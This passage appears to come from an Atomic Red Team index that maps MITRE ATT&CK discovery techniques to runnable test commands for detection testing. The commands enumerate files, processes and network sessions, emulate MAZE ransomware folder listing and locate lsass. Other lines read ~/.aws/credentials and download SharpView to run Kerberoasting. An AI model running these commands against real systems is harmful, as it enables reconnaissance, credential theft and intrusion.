      created: '2017-05-31T21:31:04.710Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1083
        external_id: T1083
      - source_name: Windows Commands JPCERT
        description: Tomonaga, S. (2016, January 26). Windows Commands Abused by Attackers.
          Retrieved February 2, 2016.
        url: https://blogs.jpcert.or.jp/en/2016/01/windows-commands-abused-by-attackers.html
      - source_name: US-CERT-TA18-106A
        description: US-CERT. (2018, April 20). Alert (TA18-106A) Russian State-Sponsored
          Cyber Actors Targeting Network Infrastructure Devices. Retrieved October
          19, 2020.
        url: https://www.us-cert.gov/ncas/alerts/TA18-106A
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      identifier: T1083
    atomic_tests:
    - name: File and Directory Discovery (cmd.exe)
      auto_generated_guid: 0e36303b-6762-4500-b003-127743b80ba6
      description: 'Find or discover files on the file system.  Upon successful execution,
        this test will output the results of all the data discovery commands to a
        specified file.

        '
      supported_platforms:
      - windows
      input_arguments:
        output_file:
          description: File to output results to
          type: string
          default: "%temp%\\T1083Test1.txt"
      executor:
        command: |
          dir /s c:\ >> #{output_file}
          dir /s "c:\Documents and Settings" >> #{output_file}
          dir /s "c:\Program Files\" >> #{output_file}
          dir "%systemdrive%\Users\*.*" >> #{output_file}
          dir "%userprofile%\AppData\Roaming\Microsoft\Windows\Recent\*.*" >> #{output_file}
          dir "%userprofile%\Desktop\*.*" >> #{output_file}
          tree /F >> #{output_file}
        cleanup_command: 'del #{output_file}

          '
        name: command_prompt
    - name: File and Directory Discovery (PowerShell)
      auto_generated_guid: 2158908e-b7ef-4c21-8a83-3ce4dd05a924
      description: 'Find or discover files on the file system. Upon execution, file
        and folder information will be displayed.

        '
      supported_platforms:
      - windows
      executor:
        command: |
          ls -recurse
          get-childitem -recurse
          gci -recurse
        name: powershell
    - name: Nix File and Directory Discovery
      auto_generated_guid: ffc8b249-372a-4b74-adcd-e4c0430842de
      description: |
        Find or discover files on the file system

        References:

        http://osxdaily.com/2013/01/29/list-all-files-subdirectory-contents-recursively/

        https://perishablepress.com/list-files-folders-recursively-terminal/
      supported_platforms:
      - macos
      - linux
      input_arguments:
        output_file:
          description: Output file used to store the results.
          type: path
          default: "/tmp/T1083.txt"
      executor:
        command: |
          ls -a >> #{output_file}
          if [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > #{output_file}; fi;
          file */* *>> #{output_file}
          cat #{output_file} 2>/dev/null
          find . -type f
          ls -R | grep ":$" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/ /' -e 's/-/|/'
          locate *
          which sh
        cleanup_command: 'rm #{output_file}

          '
        name: sh
    - name: Nix File and Directory Discovery 2
      auto_generated_guid: 13c5e1ae-605b-46c4-a79f-db28c77ff24e
      description: 'Find or discover files on the file system

        '
      supported_platforms:
      - macos
      - linux
      input_arguments:
        output_file:
          description: Output file used to store the results.
          type: path
          default: "/tmp/T1083.txt"
      executor:
        command: |
          cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > #{output_file}
          if [ -f /etc/mtab ]; then cat /etc/mtab >> #{output_file}; fi;
          find . -type f -iname *.pdf >> #{output_file}
          cat #{output_file}
          find . -type f -name ".*"
        cleanup_command: 'rm #{output_file}'
        name: sh
    - name: Simulating MAZE Directory Enumeration
      auto_generated_guid: c6c34f61-1c3e-40fb-8a58-d017d88286d8
      description: "This test emulates MAZE ransomware's ability to enumerate directories
        using Powershell. \nUpon successful execution, this test will output the directory
        enumeration results to a specified file, as well as display them in the active
        window. \nSee https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents\n"
      supported_platforms:
      - windows
      input_arguments:
        File_to_output:
          description: File to output results to
          type: string
          default: "$env:temp\\T1083Test5.txt"
      executor:
        command: "$folderarray = @(\"Desktop\", \"Downloads\", \"Documents\", \"AppData/Local\",
          \"AppData/Roaming\")\nGet-ChildItem -Path $env:homedrive -ErrorAction SilentlyContinue
          | Out-File -append #{File_to_output}\nGet-ChildItem -Path $env:programfiles
          -erroraction silentlycontinue | Out-File -append #{File_to_output}\nGet-ChildItem
          -Path \"${env:ProgramFiles(x86)}\" -erroraction silentlycontinue | Out-File
          -append #{File_to_output}\n$UsersFolder = \"$env:homedrive\\Users\\\"\nforeach
          ($directory in Get-ChildItem -Path $UsersFolder -ErrorAction SilentlyContinue)
          \n{\nforeach ($secondarydirectory in $folderarray)\n {Get-ChildItem -Path
          \"$UsersFolder/$directory/$secondarydirectory\" -ErrorAction SilentlyContinue
          | Out-File -append #{File_to_output}}\n}\ncat #{File_to_output}\n"
        cleanup_command: 'remove-item #{File_to_output} -ErrorAction SilentlyContinue

          '
        name: powershell
    - name: Launch DirLister Executable
      auto_generated_guid: c5bec457-43c9-4a18-9a24-fe151d8971b7
      description: |-
        Launches the DirLister executable for a short period of time and then exits.

        Recently seen used by [BlackCat ransomware](https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/) to create a list of accessible directories and files.
      supported_platforms:
      - windows
      input_arguments:
        dirlister_path:
          description: 'Path to the DirLister executable '
          type: string
          default: PathToAtomicsFolder\T1083\bin\DirLister.exe
      dependency_executor_name: powershell
      dependencies:
      - description: 'DirLister.exe must exist in the specified path #{dirlister_path}

          '
        prereq_command: 'if (Test-Path #{dirlister_path}) {exit 0} else {exit 1}

          '
        get_prereq_command: |
          $parentpath = Split-Path "#{dirlister_path}"
          Invoke-WebRequest https://github.com/SanderSade/DirLister/releases/download/v2.beta4/DirLister.v2.beta4.zip -OutFile $env:TEMP\TDirLister.v2.beta4.zip
          New-Item -ItemType Directory -Force -Path $parentpath | Out-Null
          Expand-Archive -Path $env:TEMP\TDirLister.v2.beta4.zip -DestinationPath $env:TEMP\TDirLister.v2.beta4 -Force
          Copy-Item $env:TEMP\TDirLister.v2.beta4\* $parentpath -Recurse
          Remove-Item $env:TEMP\TDirLister.v2.beta4.zip,$env:TEMP\TDirLister.v2.beta4 -Recurse -ErrorAction Ignore
      executor:
        command: |
          Start-Process #{dirlister_path}
          Start-Sleep -Second 4
          Stop-Process -Name "DirLister"
        name: powershell
  T1049:
    technique:
      modified: '2022-09-06T22:35:34.231Z'
      name: System Network Connections Discovery
      description: "Adversaries may attempt to get a listing of network connections
        to or from the compromised system they are currently accessing or from remote
        systems by querying for information over the network. \n\nAn adversary who
        gains access to a system that is part of a cloud-based environment may map
        out Virtual Private Clouds or Virtual Networks in order to determine what
        systems and services are connected. The actions performed are likely the same
        types of discovery techniques depending on the operating system, but the resulting
        information may include details about the networked cloud environment relevant
        to the adversary's goals. Cloud providers may have different ways in which
        their virtual networks operate.(Citation: Amazon AWS VPC Guide)(Citation:
        Microsoft Azure Virtual Network Overview)(Citation: Google VPC Overview) Similarly,
        adversaries who gain access to network devices may also perform similar discovery
        activities to gather information about connected systems and services.\n\nUtilities
        and commands that acquire this information include [netstat](https://attack.mitre.org/software/S0104),
        \"net use,\" and \"net session\" with [Net](https://attack.mitre.org/software/S0039).
        In Mac and Linux, [netstat](https://attack.mitre.org/software/S0104) and <code>lsof</code>
        can be used to list current connections. <code>who -a</code> and <code>w</code>
        can be used to show which users are currently logged in, similar to \"net
        session\". Additionally, built-in features native to network devices and [Network
        Device CLI](https://attack.mitre.org/techniques/T1059/008) may be used (e.g.
        <code>show ip sockets</code>, <code>show tcp brief</code>).(Citation: US-CERT-TA18-106A)"
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_detection: |-
        System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

        Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Further, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands may also be used to gather system and network information with built-in features native to the network device platform.  Monitor CLI activity for unexpected or unauthorized use commands being run by non-standard users from non-standard locations. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).
      x_mitre_platforms:
      - Windows
      - IaaS
      - Linux
      - macOS
      - Network
      x_mitre_is_subtechnique: false
      x_mitre_deprecated: false
      x_mitre_domains:
      - enterprise-attack
      x_mitre_version: '2.4'
      x_mitre_contributors:
      - Praetorian
      - Austin Clark, @c2defense
      x_mitre_data_sources:
      - 'Command: Command Execution'
      - 'Process: OS API Execution'
      - 'Process: Process Creation'
      type: attack-pattern
      id: attack-pattern--7e150503-88e7-4861-866b-ff1ac82c4475
      created: '2017-05-31T21:30:45.139Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1049
        external_id: T1049
      - source_name: Amazon AWS VPC Guide
        description: Amazon. (n.d.). What Is Amazon VPC?. Retrieved October 6, 2019.
        url: https://docs.aws.amazon.com/vpc/latest/userguide/what-is-amazon-vpc.html
      - source_name: Microsoft Azure Virtual Network Overview
        description: Annamalai, N., Casey, C., Almeida, M., et. al.. (2019, June 18).
          What is Azure Virtual Network?. Retrieved October 6, 2019.
        url: https://docs.microsoft.com/en-us/azure/virtual-network/virtual-networks-overview
      - source_name: Google VPC Overview
        description: Google. (2019, September 23). Virtual Private Cloud (VPC) network
          overview. Retrieved October 6, 2019.
        url: https://cloud.google.com/vpc/docs/vpc
      - source_name: US-CERT-TA18-106A
        description: US-CERT. (2018, April 20). Alert (TA18-106A) Russian State-Sponsored
          Cyber Actors Targeting Network Infrastructure Devices. Retrieved October
          19, 2020.
        url: https://www.us-cert.gov/ncas/alerts/TA18-106A
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1049
    atomic_tests:
    - name: System Network Connections Discovery
      auto_generated_guid: '0940a971-809a-48f1-9c4d-b1d785e96ee5'
      description: |
        Get a listing of network connections.

        Upon successful execution, cmd.exe will execute `netstat`, `net use` and `net sessions`. Results will output via stdout.
      supported_platforms:
      - windows
      executor:
        command: |
          netstat
          net use
          net sessions
        name: command_prompt
    - name: System Network Connections Discovery with PowerShell
      auto_generated_guid: f069f0f1-baad-4831-aa2b-eddac4baac4a
      description: |
        Get a listing of network connections.

        Upon successful execution, powershell.exe will execute `get-NetTCPConnection`. Results will output via stdout.
      supported_platforms:
      - windows
      executor:
        command: 'Get-NetTCPConnection

          '
        name: powershell
    - name: System Network Connections Discovery Linux & MacOS
      auto_generated_guid: 9ae28d3f-190f-4fa0-b023-c7bd3e0eabf2
      description: |
        Get a listing of network connections.

        Upon successful execution, sh will execute `netstat` and `who -a`. Results will output via stdout.
      supported_platforms:
      - linux
      - macos
      dependency_executor_name: sh
      dependencies:
      - description: 'Check if netstat command exists on the machine

          '
        prereq_command: 'if [ -x "$(command -v netstat)" ]; then exit 0; else exit
          1; fi;

          '
        get_prereq_command: 'echo "Install netstat on the machine."; exit 1;

          '
      executor:
        command: |
          netstat
          who -a
        name: sh
    - name: System Discovery using SharpView
      auto_generated_guid: 96f974bb-a0da-4d87-a744-ff33e73367e9
      description: "Get a listing of network connections, domains, domain users, and
        etc.  \nsharpview.exe located in the bin folder, an opensource red-team tool.\nUpon
        successful execution, cmd.exe will execute sharpview.exe <method>. Results
        will output via stdout.\n"
      supported_platforms:
      - windows
      input_arguments:
        SharpView_url:
          description: sharpview download URL
          type: url
          default: https://github.com/tevora-threat/SharpView/blob/b60456286b41bb055ee7bc2a14d645410cca9b74/Compiled/SharpView.exe?raw=true
        SharpView:
          description: Path of the executable opensource redteam tool used for the
            performing this atomic.
          type: path
          default: PathToAtomicsFolder\T1049\bin\SharpView.exe
        syntax:
          description: Arguements method used along with SharpView to get listing
            of network connections, domains, domain users, and etc.
          type: string
          default: "\"Invoke-ACLScanner\", \"Invoke-Kerberoast\", \"Find-DomainShare\"
            \n"
      dependency_executor_name: powershell
      dependencies:
      - description: 'Sharpview.exe must exist on disk at specified location (#{SharpView})

          '
        prereq_command: 'if (Test-Path #{SharpView}) {exit 0} else {exit 1}

          '
        get_prereq_command: |
          New-Item -Type Directory (split-path #{SharpView}) -ErrorAction ignore | Out-Null
          Invoke-WebRequest #{SharpView_url} -OutFile "#{SharpView}"
      executor:
        name: powershell
        elevation_required: true
        command: |
          $syntaxList = #{syntax}
          foreach ($syntax in $syntaxList) {
          #{SharpView} $syntax -}
  T1497:
    technique:
      x_mitre_platforms:
      - Windows
      - macOS
      - Linux
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Deloitte Threat Library Team
      - Sunny Neo
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--82caa33e-d11a-433a-94ea-9b5a5fbef81d
      type: attack-pattern
      created: '2019-04-17T22:22:24.505Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1497
        url: https://attack.mitre.org/techniques/T1497
      - source_name: Deloitte Environment Awareness
        url: https://drive.google.com/file/d/1t0jn3xr4ff2fR30oQAUn_RsWSnMpOAQc
        description: Torello, A. & Guibernau, F. (n.d.). Environment Awareness. Retrieved
          May 18, 2021.
      - source_name: Unit 42 Pirpi July 2015
        url: https://unit42.paloaltonetworks.com/ups-observations-on-cve-2015-3113-prior-zero-days-and-the-pirpi-payload/
        description: 'Falcone, R., Wartell, R.. (2015, July 27). UPS: Observations
          on CVE-2015-3113, Prior Zero-Days and the Pirpi Payload. Retrieved April
          23, 2019.'
      modified: '2021-10-18T14:57:48.989Z'
      name: Virtualization/Sandbox Evasion
      description: |+
        Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)

        Adversaries may use several methods to accomplish [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.(Citation: Unit 42 Pirpi July 2015)

      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: defense-evasion
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_detection: Virtualization, sandbox, user activity, and related discovery
        techniques will likely occur in the first steps of an operation but may also
        occur throughout as an adversary learns the environment. Data and events should
        not be viewed in isolation, but as part of a chain of behavior that could
        lead to other activities, such as lateral movement, based on the information
        obtained. Detecting actions related to virtualization and sandbox identification
        may be difficult depending on the adversary's implementation and monitoring
        required. Monitoring for suspicious processes being spawned that gather a
        variety of system information or perform other forms of Discovery, especially
        in a short period of time, may aid in detection.
      x_mitre_version: '1.3'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Process: OS API Execution'
      - 'Command: Command Execution'
      - 'Process: Process Creation'
      x_mitre_defense_bypassed:
      - Anti-virus
      - Host forensic analysis
      - Signature-based detection
      - Static File Analysis
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1619:
    technique:
      x_mitre_platforms:
      - IaaS
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Regina Elwell
      - Isif Ibrahima, Mandiant
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      type: attack-pattern
      id: attack-pattern--8565825b-21c8-4518-b75e-cbc4c717a156
      created: '2021-10-01T17:58:26.445Z'
      x_mitre_version: '1.0'
      external_references:
      - source_name: mitre-attack
        external_id: T1619
        url: https://attack.mitre.org/techniques/T1619
      - source_name: ListObjectsV2
        url: https://docs.aws.amazon.com/AmazonS3/latest/API/API_ListObjectsV2.html
        description: Amazon - ListObjectsV2. Retrieved October 4, 2021.
      - source_name: List Blobs
        url: https://docs.microsoft.com/en-us/rest/api/storageservices/list-blobs
        description: Microsoft - List Blobs. (n.d.). Retrieved October 4, 2021.
      x_mitre_deprecated: false
      revoked: false
      description: |-
        Adversaries may enumerate objects in cloud storage infrastructure. Adversaries may use this information during automated discovery to shape follow-on behaviors, including requesting all or specific objects from cloud storage.  Similar to [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) on a local host, after identifying available storage services (i.e. [Cloud Infrastructure Discovery](https://attack.mitre.org/techniques/T1580)) adversaries may access the contents/objects stored in cloud infrastructure.

        Cloud service providers offer APIs allowing users to enumerate objects stored within cloud storage. Examples include ListObjectsV2 in AWS (Citation: ListObjectsV2) and List Blobs in Azure(Citation: List Blobs) .
      modified: '2022-04-11T22:29:43.677Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      name: Cloud Storage Object Discovery
      x_mitre_detection: "System and network discovery techniques normally occur throughout
        an operation as an adversary learns the environment. Data and events should
        not be viewed in isolation, but as part of a chain of behavior that could
        lead to other activities, such as Collection and Exfiltration, based on the
        information obtained. \nMonitor cloud logs for API calls used for file or
        object enumeration for unusual activity. "
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_is_subtechnique: false
      x_mitre_data_sources:
      - 'Cloud Storage: Cloud Storage Access'
      - 'Cloud Storage: Cloud Storage Enumeration'
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1619
    atomic_tests:
    - name: AWS S3 Enumeration
      auto_generated_guid: 3c7094f8-71ec-4917-aeb8-a633d7ec4ef5
      description: "This test will enumerate all the S3 buckets in the user account
        and lists all the files in each bucket. \n"
      supported_platforms:
      - iaas:azure
      dependencies:
      - description: 'Check if ~/.aws/credentials file has a default stanza is configured

          '
        prereq_command: 'cat ~/.aws/credentials | grep "default"

          '
        get_prereq_command: 'echo Please install the aws-cli and configure your AWS
          default profile using: aws configure

          '
      executor:
        command: 'for bucket in "$(aws s3 ls | cut -d " " -f3)"; do aws s3api list-objects-v2
          --bucket $bucket --output text; done

          '
        name: sh
        elevation_required: false
  T1087.004:
    technique:
      x_mitre_platforms:
      - Azure AD
      - Office 365
      - SaaS
      - IaaS
      - Google Workspace
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Praetorian
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--8f104855-e5b7-4077-b1f5-bc3103b41abe
      type: attack-pattern
      created: '2020-02-21T21:08:36.570Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1087.004
        url: https://attack.mitre.org/techniques/T1087/004
      - description: Microsoft. (n.d.). Get-MsolRoleMember. Retrieved October 6, 2019.
        url: https://docs.microsoft.com/en-us/powershell/module/msonline/get-msolrolemember?view=azureadps-1.0
        source_name: Microsoft msolrolemember
      - description: Stringer, M.. (2018, November 21). RainDance. Retrieved October
          6, 2019.
        url: https://github.com/True-Demon/raindance
        source_name: GitHub Raindance
      - description: Microsoft. (n.d.). az ad user. Retrieved October 6, 2019.
        url: https://docs.microsoft.com/en-us/cli/azure/ad/user?view=azure-cli-latest
        source_name: Microsoft AZ CLI
      - description: Felch, M.. (2018, August 31). Red Teaming Microsoft Part 1 Active
          Directory Leaks via Azure. Retrieved October 6, 2019.
        url: https://www.blackhillsinfosec.com/red-teaming-microsoft-part-1-active-directory-leaks-via-azure/
        source_name: Black Hills Red Teaming MS AD Azure, 2018
      - source_name: AWS List Roles
        description: Amazon. (n.d.). List Roles. Retrieved August 11, 2020.
        url: https://docs.aws.amazon.com/cli/latest/reference/iam/list-roles.html
      - source_name: AWS List Users
        url: https://docs.aws.amazon.com/cli/latest/reference/iam/list-users.html
        description: Amazon. (n.d.). List Users. Retrieved August 11, 2020.
      - source_name: Google Cloud - IAM Servie Accounts List API
        url: https://cloud.google.com/sdk/gcloud/reference/iam/service-accounts/list
        description: Google. (2020, June 23). gcloud iam service-accounts list. Retrieved
          August 4, 2020.
      modified: '2021-03-16T12:54:41.133Z'
      name: Cloud Account
      description: "Adversaries may attempt to get a listing of cloud accounts. Cloud
        accounts are those created and configured by an organization for use by users,
        remote support, services, or for administration of resources within a cloud
        service provider or SaaS application.\n\nWith authenticated access there are
        several tools that can be used to find accounts. The <code>Get-MsolRoleMember</code>
        PowerShell cmdlet can be used to obtain account names given a role or permissions
        group in Office 365.(Citation: Microsoft msolrolemember)(Citation: GitHub
        Raindance) The Azure CLI (AZ CLI) also provides an interface to obtain user
        accounts with authenticated access to a domain. The command <code>az ad user
        list</code> will list all users within a domain.(Citation: Microsoft AZ CLI)(Citation:
        Black Hills Red Teaming MS AD Azure, 2018) \n\nThe AWS command <code>aws iam
        list-users</code> may be used to obtain a list of users in the current account
        while <code>aws iam list-roles</code> can obtain IAM roles that have a specified
        path prefix.(Citation: AWS List Roles)(Citation: AWS List Users) In GCP, <code>gcloud
        iam service-accounts list</code> and <code>gcloud projects get-iam-policy</code>
        may be used to obtain a listing of service accounts and users in a project.(Citation:
        Google Cloud - IAM Servie Accounts List API)"
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_detection: |-
        Monitor processes, command-line arguments, and logs for actions that could be taken to gather information about cloud accounts, including the use of calls to cloud APIs that perform account discovery.

        System and network discovery techniques normally occur throughout an operation as an adversary learns the environment, and also to an extent in normal network operations. Therefore discovery data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.2'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Command: Command Execution'
      x_mitre_permissions_required:
      - User
    atomic_tests: []
  T1057:
    technique:
      modified: '2023-04-12T23:34:02.125Z'
      name: Process Discovery
      description: |-
        Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

        In Windows environments, adversaries could obtain details on running processes using the [Tasklist](https://attack.mitre.org/software/S0057) utility via [cmd](https://attack.mitre.org/software/S0106) or <code>Get-Process</code> via [PowerShell](https://attack.mitre.org/techniques/T1059/001). Information about processes can also be extracted from the output of [Native API](https://attack.mitre.org/techniques/T1106) calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via /proc.

        On network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show processes` can be used to display current running processes.(Citation: US-CERT-TA18-106A)(Citation: show_processes_cisco_cmd)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_contributors:
      - Austin Clark, @c2defense
      x_mitre_deprecated: false
      x_mitre_detection: |-
        System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

        Normal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).

        For network infrastructure devices, collect AAA logging to monitor for `show` commands being run by non-standard users from non-standard locations.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      - Network
      x_mitre_version: '1.3'
      x_mitre_data_sources:
      - 'Process: OS API Execution'
      - 'Command: Command Execution'
      - 'Process: Process Creation'
      x_mitre_system_requirements:
      - Administrator, SYSTEM may provide better process ownership details
      type: attack-pattern
      id: attack-pattern--8f4a33ec-8b1f-4b80-a2f6-642b2e479580
      created: '2017-05-31T21:30:48.728Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1057
        external_id: T1057
      - source_name: show_processes_cisco_cmd
        description: Cisco. (2022, August 16). show processes - . Retrieved July 13,
          2022.
        url: https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/fundamentals/command/cf_command_ref/show_monitor_permit_list_through_show_process_memory.html#wp3599497760
      - source_name: US-CERT-TA18-106A
        description: US-CERT. (2018, April 20). Alert (TA18-106A) Russian State-Sponsored
          Cyber Actors Targeting Network Infrastructure Devices. Retrieved October
          19, 2020.
        url: https://www.us-cert.gov/ncas/alerts/TA18-106A
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1057
    atomic_tests:
    - name: Process Discovery - ps
      auto_generated_guid: 4ff64f0b-aaf2-4866-b39d-38d9791407cc
      description: |
        Utilize ps to identify processes.

        Upon successful execution, sh will execute ps and output to /tmp/loot.txt.
      supported_platforms:
      - macos
      - linux
      input_arguments:
        output_file:
          description: path of output file
          type: path
          default: "/tmp/loot.txt"
      executor:
        command: |
          ps >> #{output_file}
          ps aux >> #{output_file}
        cleanup_command: 'rm #{output_file}

          '
        name: sh
    - name: Process Discovery - tasklist
      auto_generated_guid: c5806a4f-62b8-4900-980b-c7ec004e9908
      description: "Utilize tasklist to identify processes.\n\nUpon successful execution,
        cmd.exe will execute tasklist.exe to list processes. Output will be via stdout.
        \n"
      supported_platforms:
      - windows
      executor:
        command: 'tasklist

          '
        name: command_prompt
    - name: Process Discovery - Get-Process
      auto_generated_guid: 3b3809b6-a54b-4f5b-8aff-cb51f2e97b34
      description: "Utilize Get-Process PowerShell cmdlet to identify processes.\n\nUpon
        successful execution, powershell.exe will execute Get-Process to list processes.
        Output will be via stdout. \n"
      supported_platforms:
      - windows
      executor:
        command: 'Get-Process

          '
        name: powershell
    - name: Process Discovery - get-wmiObject
      auto_generated_guid: b51239b4-0129-474f-a2b4-70f855b9f2c2
      description: "Utilize get-wmiObject PowerShell cmdlet to identify processes.\n\nUpon
        successful execution, powershell.exe will execute get-wmiObject to list processes.
        Output will be via stdout. \n"
      supported_platforms:
      - windows
      executor:
        command: 'get-wmiObject -class Win32_Process

          '
        name: powershell
    - name: Process Discovery - wmic process
      auto_generated_guid: 640cbf6d-659b-498b-ba53-f6dd1a1cc02c
      description: "Utilize windows management instrumentation to identify processes.\n\nUpon
        successful execution, WMIC will execute process to list processes. Output
        will be via stdout. \n"
      supported_platforms:
      - windows
      executor:
        command: 'wmic process get /format:list

          '
        name: command_prompt
    - name: Discover Specific Process - tasklist
      auto_generated_guid: 11ba69ee-902e-4a0f-b3b6-418aed7d7ddb
      description: "Adversaries may use command line tools to discover specific processes
        in preparation of further attacks. \nExamples of this could be discovering
        the PID of lsass.exe to dump its memory or discovering whether specific security
        processes (e.g. AV or EDR) are running.\n"
      supported_platforms:
      - windows
      input_arguments:
        process_to_enumerate:
          description: Process name string to search for.
          type: string
          default: lsass
      executor:
        command: 'tasklist | findstr #{process_to_enumerate}

          '
        name: command_prompt
  T1497.002:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Deloitte Threat Library Team
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--91541e7e-b969-40c6-bbd8-1b5352ec2938
      type: attack-pattern
      created: '2020-03-06T21:04:12.454Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1497.002
        url: https://attack.mitre.org/techniques/T1497/002
      - source_name: Deloitte Environment Awareness
        url: https://drive.google.com/file/d/1t0jn3xr4ff2fR30oQAUn_RsWSnMpOAQc
        description: Torello, A. & Guibernau, F. (n.d.). Environment Awareness. Retrieved
          May 18, 2021.
      - source_name: Sans Virtual Jan 2016
        url: https://www.sans.org/reading-room/whitepapers/forensics/detecting-malware-sandbox-evasion-techniques-36667
        description: Keragala, D. (2016, January 16). Detecting Malware and Sandbox
          Evasion Techniques. Retrieved April 17, 2019.
      - source_name: Unit 42 Sofacy Nov 2018
        url: https://unit42.paloaltonetworks.com/unit42-sofacy-continues-global-attacks-wheels-new-cannon-trojan/
        description: Falcone, R., Lee, B.. (2018, November 20). Sofacy Continues Global
          Attacks and Wheels Out New ‘Cannon’ Trojan. Retrieved April 23, 2019.
      - url: https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html
        description: Carr, N., et al. (2017, April 24). FIN7 Evolution and the Phishing
          LNK. Retrieved April 24, 2017.
        source_name: FireEye FIN7 April 2017
